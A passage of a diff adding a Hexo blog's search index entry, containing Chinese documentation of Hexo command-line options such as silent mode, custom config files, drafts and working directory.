+<p>在终端中显示调试信息并记录到 <code>debug.log</code>。当您碰到问题时，可以尝试用调试模式重新执行一次，并 <a href="https://github.com/hexojs/hexo/issues/new">提交调试信息到 GitHub</a>。</p>
+<h4 id="简洁模式"><a href="#简洁模式" class="headerlink" title="简洁模式"></a>简洁模式</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="comment">--silent</span></span><br></pre></td></tr></table></figure>
+
+<p>隐藏终端信息。</p>
+<h4 id="自定义配置文件的路径"><a href="#自定义配置文件的路径" class="headerlink" title="自定义配置文件的路径"></a>自定义配置文件的路径</h4><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"># 使用 custom<span class="variable">.yml</span> 代替默认的 <span class="number">_</span><span class="keyword">config</span><span class="variable">.yml</span></span><br><span class="line">$ hexo server --<span class="keyword">config</span> custom<span class="variable">.yml</span></span><br><span class="line"></span><br><span class="line"># 使用 custom<span class="variable">.yml</span> 和 custom2<span class="variable">.json</span>，其中 custom2<span class="variable">.json</span> 优先级更高</span><br><span class="line">$ hexo <span class="keyword">generate</span> --<span class="keyword">config</span> custom<span class="variable">.yml</span>,custom2<span class="variable">.json</span>,custom3<span class="variable">.yml</span></span><br></pre></td></tr></table></figure>
+
+<p>自定义配置文件的路径，指定这个参数后将不再使用默认的 <code>_config.yml</code>。<br>你可以使用一个 YAML 或 JSON 文件的路径，也可以使用逗号分隔（无空格）的多个 YAML 或 JSON 文件的路径。例如：</p>
+<figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"># 使用 custom<span class="variable">.yml</span> 代替默认的 <span class="number">_</span><span class="keyword">config</span><span class="variable">.yml</span></span><br><span class="line">$ hexo server --<span class="keyword">config</span> custom<span class="variable">.yml</span></span><br><span class="line"></span><br><span class="line"># 使用 custom<span class="variable">.yml</span>, custom2<span class="variable">.json</span> 和 custom3<span class="variable">.yml</span>，其中 custom3<span class="variable">.yml</span> 优先级最高，其次是 custom2<span class="variable">.json</span></span><br><span class="line">$ hexo <span class="keyword">generate</span> --<span class="keyword">config</span> custom<span class="variable">.yml</span>,custom2<span class="variable">.json</span>,custom3<span class="variable">.yml</span></span><br></pre></td></tr></table></figure>
+
+<p>当你指定了多个配置文件以后，Hexo 会按顺序将这部分配置文件合并成一个 <code>_multiconfig.yml</code>。如果遇到重复的配置，排在后面的文件的配置会覆盖排在前面的文件的配置。这个原则适用于任意数量、任意深度的 YAML 和 JSON 文件。</p>
+<h4 id="显示草稿"><a href="#显示草稿" class="headerlink" title="显示草稿"></a>显示草稿</h4><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">$ hexo <span class="comment">--draft</span></span><br></pre></td></tr></table></figure>
+
+<p>显示 <code>source/_drafts</code> 文件夹中的草稿文章。</p>
+<h4 id="自定义-CWD"><a href="#自定义-CWD" class="headerlink" title="自定义 CWD"></a>自定义 CWD</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">$ hexo --cwd <span class="regexp">/path/</span>to/cwd</span><br></pre></td></tr></table></figure>
+
+<p>自定义当前工作目录（Current working directory）的路径。</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>CodeSheep的B站视频：</p>
+<p><a href="https://www.bilibili.com/video/BV1q4411i7gL/?spm_id_from=333.788.recommend_more_video.0">https://www.bilibili.com/video/BV1q4411i7gL/?spm_id_from=333.788.recommend_more_video.0</a></p>
+]]></content>
+      <tags>
+        <tag>hexo</tag>
+        <tag>yilia</tag>
+      </tags>
+  </entry>
+</search>
